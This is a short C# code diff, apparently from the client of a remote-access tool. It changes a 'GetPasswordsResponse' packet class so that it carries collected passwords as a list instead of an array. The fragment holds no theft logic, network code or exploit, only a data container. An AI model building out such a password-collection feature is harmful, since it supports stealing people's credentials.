@@ -1,4 +1,5 @@
-﻿using ProtoBuf;
+﻿using System.Collections.Generic;
+using ProtoBuf;
 using xClient.Core.Networking;
 
 namespace xClient.Core.Packets.ClientPackets
@@ -7,13 +8,13 @@ namespace xClient.Core.Packets.ClientPackets
     public class GetPasswordsResponse : IPacket
     {
         [ProtoMember(1)]
-        public string[] Passwords { get; set; }
+        public List<string> Passwords { get; set; }
 
         public GetPasswordsResponse()
         {
         }
 
-        public GetPasswordsResponse(string[] data)
+        public GetPasswordsResponse(List<string> data)
         {
             this.Passwords = data;
         }
